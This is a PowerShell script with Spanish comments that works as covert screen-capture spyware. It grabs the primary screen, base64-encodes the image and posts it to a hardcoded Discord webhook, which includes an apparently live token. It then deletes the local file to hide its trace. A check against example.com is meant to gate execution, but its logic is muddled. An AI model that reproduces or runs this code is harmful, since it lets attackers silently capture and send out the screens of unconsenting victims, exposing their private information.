# Función para verificar si se está ejecutando desde un host remoto
function IsRunningFromHost {
    $hostName = [System.Net.Dns]::GetHostName()
    $localHostAddresses = [System.Net.Dns]::GetHostAddresses($hostName) | Where-Object { $_.AddressFamily -eq "InterNetwork" } | ForEach-Object { $_.IPAddressToString }
    $remoteHostAddresses = [System.Net.Dns]::GetHostAddresses("example.com") | Where-Object { $_.AddressFamily -eq "InterNetwork" } | ForEach-Object { $_.IPAddressToString }
    
    return ($localHostAddresses -ne $remoteHostAddresses)
}

# Definir la URL del webhook de Discord
$webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"

# Función para tomar una captura de pantalla y enviarla al webhook
function Send-ScreenshotToDiscord {
    # Definir el nombre del archivo de la captura de pantalla
    $fileName = "$env:USERPROFILE\Documents\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
    
    # Tomar la captura de pantalla
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    
    # Guardar la captura de pantalla en un archivo
    $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)
    
    # Enviar la captura de pantalla al webhook de Discord
    $file = [System.IO.File]::ReadAllBytes($fileName)
    $base64File = [Convert]::ToBase64String($file)
    $data = @{
        content = "Screenshot $(Get-Date -Format 'yyyyMMdd_HHmmss'):"
        file = "data:image/png;base64,$base64File"
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $data
    
    # Eliminar el archivo de la captura de pantalla
    Remove-Item -Path $fileName
}

# Verificar si se está ejecutando desde un host remoto
if (-not (IsRunningFromHost)) {
    # Bucle principal: tomar dos capturas de pantalla cada 30 segundos
    for ($i = 1; $i -le 2; $i++) {
        Send-ScreenshotToDiscord
        Start-Sleep -Seconds 30
    }
}
else {
    Write-Host "El script se está ejecutando desde un host remoto. No se tomarán capturas de pantalla."
}
